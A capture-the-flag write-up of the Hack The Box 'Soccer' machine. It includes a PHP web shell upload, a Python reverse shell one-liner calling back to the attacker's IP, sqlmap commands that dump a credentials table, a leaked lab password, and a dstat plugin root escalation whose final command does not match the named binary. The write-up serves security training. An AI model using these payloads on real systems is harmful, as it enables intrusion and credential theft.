
![[soccer logo.png]]

# Summary

- [Énumération](#énumération)
- [Website - soccer.htb](#website---soccerhtb)
	- [Directories Enumeration with FFUF](#directories-enumeration-with-ffuf)
	- [Tiny File Manager](#tiny-file-manager)
		- [Exploit](#exploit)
		- [Upgrade our shell](#upgrade-our-shell)
- [Shell as www-data](#shell-as-www-data)
- [Website - soc-player.soccer.htb](#website---soc-playersoccerhtb)
	- [Websocket](#websocket)
	- [Sqlmap on websocket](#sqlmap-on-websocket)
- [Shell as player](#shell-as-player)
- [Privileges Escalation](#privileges-escalation)

---
# Énumération

We start by scanning our target

```
nmap -sVC 10.129.59.169 -oN scan.txt
```

```
<SNIP>

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close

<SNIP>
```

Not much to do with ssh as of yet, so let's dig into the port 80.

# Website - soccer.htb

I first needed to add `soccer.htb` to my `/etc/hosts` file.

```
echo '10.129.59.169 soccer.htb' | tee -a /etc/hosts
```

![Pasted image 20260128093913](Images/Pasted%20image%2020260128093913.png)


### Directories Enumeration with FFUF

Looks like it's a website about soccer. I didn't find anything usefull so i enumerated the directories using `ffuf`.

```
ffuf -c -w `fzf-wordlists` -u "http://soccer.htb/FUZZ" -e .php,.txt 
```

And i found the directory `/tiny`

![Pasted image 20260128094437](Images/Pasted%20image%2020260128094437.png)

### Tiny File Manager

We need to authenticate before proceeding. By watching the source code, i found a link to the github repo of **Tiny File Manager** and the version used on the website, which is **2.4.3**.

I looked for CVE and i found the **CVE-2021-45010** on [exploit.db](https://www.exploit-db.com/exploits/50828) but i need to get valide credentials.
I clicked into the link of the solution and i clicked on **"Docs"** which led me to the repo. 

![Pasted image 20260128095044](Images/Pasted%20image%2020260128095044.png)

![Pasted image 20260128095100](Images/Pasted%20image%2020260128095100.png)

When clicking on **Security and User Managements**, the default credentials are shown.

![Pasted image 20260128095314](Images/Pasted%20image%2020260128095314.png)

After testing them, the credentials `admin:admin@123` works.

![Pasted image 20260128095535](Images/Pasted%20image%2020260128095535.png)
##### Exploit

I tried to use the exploit found earlier but it didn't work because i don't have write permission on the folder. I had to do it manually.

![Pasted image 20260128095720](Images/Pasted%20image%2020260128095720.png)

To exploit the vulnerabily, i have to upload a file with **php** code in order to get an RCE or a Reverse Shell.

I have write access on the folder `/tiny/uploads` so let's craft our payload.

```
echo '<?php echo shell_exec($_GET['cmd']);?>' > shell.php
```

Then i upload it to the folder

![Pasted image 20260128100058](Images/Pasted%20image%2020260128100058.png)

Next, i just have to get to my file from the URL to get an RCE

```
http://soccer.htb/tiny/uploads/shell.php?cmd=id
```

![Pasted image 20260128100201](Images/Pasted%20image%2020260128100201.png)
Now that i got an RCE and i know it works, i can get a reverse shell.

I went on https://www.revshells.com/, crafted a payload in `python3` by selecting **Python3 #2** and put it in the url.

**Note** : Our uploaded file can be deleted if we are too long, if it happens just restart from the beginning.

We start a listener on our attacking machine,

```
nc -lvnp 443
```

And we use put our payload in the URL.

```
http://soccer.htb/tiny/uploads/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.194",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

![Pasted image 20260128100945](Images/Pasted%20image%2020260128100945.png)

##### Upgrade our shell

We should stabilize our shell before proceeding.

```
export TERM=xterm
```
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

We press CTRL+Z to background our session

```
stty raw -echo && fg
```
```
reset
```

# Shell as www-data

Now that we got a shell as www-data, i have to find a way to pivot to another user.

There is a user named `player` but i can't read the `user.txt` because i don't have right on it.

I looked for SUID binary and found one interessting

```
find / -perm -4000 2>/dev/null
```

```
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at

<SNIP>
```

`doas` looks promising but i can't exploit it now, i need to elevate as `player`.

```
cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

I tried looking in `.conf` file to see what i could find, and i found in `etc/nginx/sites-availble` that there is a subdomain running on the target called `soc-player.soccer.htb`

So i added it to my `/etc/hosts` file

```
echo 10.129.59.169 soc-player.soccer.htb | tee -a /etc/hosts
```

# Website - soc-player.soccer.htb

![Pasted image 20260128111009](Images/Pasted%20image%2020260128111009.png)

Others options have appeared such as **signup** and **login**.
As i didn't have credentials on login page, i created an account.

![Pasted image 20260128111156](Images/Pasted%20image%2020260128111156.png)

And after loggin in, i landed on `/check` which ask me to check the validity of our ticket.

![Pasted image 20260128111353](Images/Pasted%20image%2020260128111353.png)

### Websocket

After looking in the devtools, i found that there is a connection to port 9091 which is a websocket.

![Pasted image 20260128112655](Images/Pasted%20image%2020260128112655.png)

To get the url, i right clicked on the connexion and selected "open in a new tab" which gave me the url : `ws://soc-player.soccer.htb:9091/`

I tried to use `sqlmap` on it to see if i could get an injection, because the back end probably look like `SELECT * FROM <table> WHERE id = <number>;`.

`Burpsuite` helped me to figure what request was send to check the validity.

![Pasted image 20260128113025](Images/Pasted%20image%2020260128113025.png)

### Sqlmap on websocket

Now that i know the request send, i can use `sqlmap`.

```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"123"}' --level 5 --risk 3
```

At the end of the scan, it appears that the parameters `id` is vulnerable and so we can dump the data we want.

Let's enumerate the database

```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"123"}' --dbs
```

![sqlmap 1](Images/sqlmap%201.png)

There are 5 databases on the target, the most interesting is probably `soccer_db`, so let's extract the tables.

```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"123"}' -D soccer_db --tables
```

![sqlmap 2](Images/sqlmap%202.png)

There is only one table named `accounts`, we can now dump the data inside it.

```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"123"}' -D soccer_db -T accounts --dump
```

![sqlmap 3](Images/sqlmap%203.png)

I got the password `PlayerOftheMatch2022` for username `player`.

# Shell as player

I trieds the creds obtained with ssh

![ssh as player](Images/ssh%20as%20player.png)

And it worked, i got access to the target as `player`.

# Privileges Escalation

From now, i know that i can exploit the SUID binary `doas` because of the `.conf` file of the binary that allows me to run `dstat` as a priviliged user.

I looked on **GTFObins.org** for that binary to see how i could exploit it.
https://gtfobins.org/gtfobins/dstat/

The binary allows me to run arbitrary python scripts loaded as external plugins if they are located in a specific folder explained in the link above.

So i created my python payload to exploit this and put it into `/usr/local/share/dstat/`.

```
echo 'import os; os.execv("/bin/bash", ["bash"])' > /usr/local/share/dstat/dstat_pwn.py
```

And i can run `dstat` to import my script and get a shell as root.

```
doas /usr/bin/pwn --pwn
```

![Pasted image 20260128114708](Images/Pasted%20image%2020260128114708.png)

The root flag is located in the `/root` folder.
